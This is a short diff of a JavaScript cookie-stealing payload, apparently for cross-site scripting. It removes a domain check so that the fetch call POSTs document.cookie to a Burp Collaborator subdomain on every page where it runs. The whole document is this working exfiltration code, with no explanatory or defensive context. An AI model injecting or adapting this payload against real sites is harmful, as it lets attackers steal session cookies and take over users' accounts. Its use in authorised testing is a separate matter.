@@ -1,7 +1,6 @@
-if (document.domain == "www.pornhub.org") {
-  fetch('https://xstaw37ectlfkh310wnbuxbdq4wukj.burpcollaborator.net', {
-  method: 'POST',
-  mode: 'no-cors',
-  body:document.cookie
+fetch('https://ntks17v3x222kxd9nfk8nqdsnjt9hy.burpcollaborator.net', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
 });
-}
+
